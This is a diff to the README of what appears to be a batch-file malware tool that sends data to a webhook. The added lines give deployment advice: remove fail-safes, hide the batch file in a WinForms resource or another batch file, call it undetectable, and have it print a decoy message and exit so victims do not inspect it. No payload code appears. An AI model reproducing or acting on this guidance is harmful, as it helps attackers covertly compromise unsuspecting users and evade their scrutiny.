@@ -17,12 +17,16 @@
 # How to use
 
 1. Change the webhook to yours
-2. Remove fail-safes
+2. Remove fail-safes (goto xxx)
 3. Run the batch file
 
 ### Use cases
 * Obfuscate (or not, FUD anyways) add as winforms resource.
-* Obfuscate (or not, FUD anyways) and put inside another batch file.
+* Obfuscate (or not, FUD anyways) and put inside another batch file to kind of hide it.
+* Edit the batch to echo something and give it an excuse to exit. Obfuscation helps to hide if user decides to open the file.
+
+### Avoid
+* Just changing the webhook and doing nothing else. If the batch file does nothing the user will open it to see what's wrong.
 
 # Features
 
